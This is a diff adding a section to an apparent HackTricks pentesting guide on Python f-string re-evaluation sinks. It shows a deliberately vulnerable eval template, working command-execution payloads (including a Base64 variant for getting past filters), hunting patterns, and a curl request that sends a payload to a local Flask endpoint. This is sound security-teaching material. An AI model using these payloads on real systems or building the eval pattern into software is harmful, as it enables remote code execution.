@@ -125,6 +125,54 @@ exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 
+### F-string re-evaluation sinks
+
+A different but very common bug is to **insert attacker-controlled data into a string and then evaluate that string as an f-string**. This is **not** Jinja/SSTI; the Python interpreter itself executes anything placed inside `{...}` during the second evaluation step:
+
+```python
+def template(first, last, gender):
+    text = f"Patient {first} {last} ({gender})"
+    return eval(f"f'''{text}'''")
+```
+
+```python
+s = "2+3"
+eval(f"f'''{s}'''")
+# '2+3'
+
+s = "{2+3}"
+eval(f"f'''{s}'''")
+# '5'
+```
+
+So, if braces, quotes, dots, underscores and parentheses are allowed, a payload such as the following usually gives command execution:
+
+```python
+{__import__("os").popen("id").read()}
+```
+
+If spaces or shell metacharacters are filtered, wrap the command in Base64 and decode it inside the expression:
+
+```python
+{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
+```
+
+Useful hunting patterns:
+
+- `eval(f"f'''{user_input}'''")`
+- `eval(f'f"{user_input}"')`
+- Code that builds a template with user data and then calls `eval`, `exec`, or `compile` on the rebuilt string
+- XML/JSON handlers that validate characters with regexes but still allow `{}` and quotes
+
+If the sink is behind a Flask endpoint that parses raw XML/bytes from `request.data`, remember that `curl -d` defaults to `application/x-www-form-urlencoded`, which can leave `request.data` empty. Use a **non-form** content type instead:
+
+```bash
+curl http://127.0.0.1:54321/addPatient \
+  -X POST \
+  -H 'Content-Type: application/xml' \
+  -d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
+```
+
 ### Other libraries that allow to eval python code
 
 ```python
@@ -1163,5 +1211,6 @@ will be bypassed
 - [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
 - [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
 - [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+- [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth hash cracking, and Flask f-string eval privilege escalation](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
